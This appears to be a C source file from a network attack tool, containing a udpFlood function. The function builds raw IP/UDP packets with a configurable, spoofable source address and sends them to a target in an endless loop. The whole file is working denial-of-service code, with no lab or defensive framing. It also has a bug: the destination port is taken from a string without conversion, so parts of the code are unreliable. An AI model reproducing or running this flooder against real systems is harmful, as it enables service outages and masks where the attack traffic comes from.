#include <stdio.h>
#include <string.h> //memset
#include <sys/socket.h>
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/udp.h>   //Provides declarations for udp header
#include <netinet/ip.h>    //Provides declarations for ip header

#include "../include/headers.h"
#include "../include/udpheader.h"
#include "../include/prototypes.h"
#include "../include/callback.h"

extern const char *srcIP;
extern const char *srcPort;

extern const char *dstIP;
extern const char *dstPort;

extern int udpActif;
extern int tcpActif;

extern int flood_on;

void udpFlood(void)
{
    int sock = 0;
    SOCKADDR_IN sin;
    struct pseudo_header psh;

    char datagram[4096];
    char source_ip[32];

    char *data;
    char *pseudogram;
    int packet_size = 0;

    int src_port = 0;
    int dst_port = 0;

    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;

    //UDP header
    struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));

    udpActif = 1;

    sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);

    if(sock == -1)
    {
        perror("Failed to create raw socket");
        exit(1);
    }

    memset (datagram, 0, 4096);

    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

    strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&é(-è_çà)=^$ù*!:;,<>");

    strcpy(source_ip , srcIP);

    src_port = atoi(srcPort);
    dst_port = atoi(dstPort);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(dstPort);
    sin.sin_addr.s_addr = inet_addr(dstIP);

    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = udp_csum((unsigned short *) datagram, iph->tot_len);

    // UDP header
    udph->source = htons(src_port);
    udph->dest = htons(dst_port);
    udph->len = htons(8 + strlen(data));
    udph->check = 0;

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + strlen(data) );

    packet_size = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);

    pseudogram = malloc((size_t)packet_size);

    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), udph , sizeof(struct udphdr) + strlen(data));

    udph->check = udp_csum((unsigned short*)pseudogram, packet_size);

    flood_on = 1;

    while (1)
    {
        if (sendto (sock, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
        }

        else
        {
            printf ("Packet Send. Length : %d\n" , iph->tot_len);
        }
    }
}

unsigned short udp_csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while(nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1)
    {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum >> 16)+(sum & 0xffff);
    sum = sum + (sum >> 16);
    answer= (short)~sum;

    return((unsigned short)answer);
}
